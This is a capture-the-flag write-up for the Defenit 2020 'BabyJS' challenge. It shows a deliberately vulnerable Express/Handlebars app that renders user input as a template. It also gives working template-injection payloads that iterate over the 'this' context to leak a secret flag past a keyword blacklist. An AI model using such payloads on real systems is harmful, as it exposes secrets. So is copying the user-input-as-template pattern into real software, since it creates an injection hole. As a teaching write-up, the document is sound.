---
title: BabyJS - 2020 Defenit CTF
date: 2020-06-10 11:14:30
author: Az3z3l
author_url: https://twitter.com/Az3z3l
categories:
 - Web Exploitation
tags:
 - Handlebars template injection
 - Ssti
 - Defenit
---

**tl;dr**

+ Accessing a variable in Handlebars template using `this` object 

<!--more-->

**Challenge points**: 248
**Solved by**: [Az3z3l](https://twitter.com/Az3z3l) & [Captain-K](https://twitter.com/Captainkay11)
**Source Code**: 
## app.js
```javascript
const express = require('express');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const app = express();

const SALT = crypto.randomBytes(64).toString('hex');
const FLAG = require('./config').FLAG;

app.set('view engine', 'html');
app.engine('html', require('hbs').__express);

if (!fs.existsSync(path.join('views', 'temp'))) {
    fs.mkdirSync(path.join('views', 'temp'));
}

app.use(express.urlencoded({ extended: true }));
app.use((req, res, next) => {
    const { content } = req.body;

    req.userDir = crypto.createHash('md5').update(`${req.connection.remoteAddress}_${SALT}`).digest('hex');
    req.saveDir = path.join('views', 'temp', req.userDir);

    if (!fs.existsSync(req.saveDir)) {
        fs.mkdirSync(req.saveDir);
    }

    if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {
        res.end('Request blocked');
        return;
    }

    next();
});

app.get('/', (req, res) => {
    const { p } = req.query;
    if (!p) res.redirect('/?p=index');
    else res.render(p, { FLAG, 'apple': 'mint' });
});

app.post('/', (req, res) => {
    const { body: { content }, userDir, saveDir } = req;
    const filename = crypto.randomBytes(8).toString('hex');

    let p = path.join('temp', userDir, filename)
    
    fs.writeFile(`${path.join(saveDir, filename)}.html`, content, () => {
        res.redirect(`/?p=${p}`);
    })
});

app.listen(8010, '0.0.0.0');
console.log("http://0.0.0.0:8010")
```

## config.js
```javascript
module.exports = {
    FLAG: 'Defenit{flag-in-here}'
};
```

## Challenge Description

Render me If you can

## Solution

We are directed to a page which has a text box which renders the text we give it. We are also provided with the source code of the challenge. From that we can see how the input we give is rendened. 

```javascript
app.get('/', (req, res) => {
    const { p } = req.query;
    if (!p) res.redirect('/?p=index');
    else res.render(p, { FLAG, 'apple': 'mint' });
});
```

From this, it is clear that we need to access `FLAG` variable to get the flag. Also from basic googling we'll know that render uses Handlebars template. Since there are two variables being passed, we can test this by passing `{{apple}}` and we'll be returned with `mint`. But, it won't be that easy with the filter they are using, which is blacklisting the word `FLAG`.


```javascript
if (typeof content === 'string' && content.indexOf('FLAG') != -1 || typeof content === 'string' && content.length > 200) {
        res.end('Request blocked');
        return;
    }
```

By going through the [documentation](https://handlebarsjs.com/guide/builtin-helpers.html#each), I tried to access the flag by going through `this` object. 

```
{{#each this}} {{this}} {{/each}}
```
But, due to a TypeError: Cannot convert object to primitive value, we won't the flag directly. 

This can be overcome by reading the flag letter by letter. 

```
{{#each this}} {{this.[0]}} {{/each}}
```

Update the value of 0 till you get  `}`.

## Flag : 

Defenit{w3bd4v_0v3r_h7tp_n71m_0v3r_Sm8}
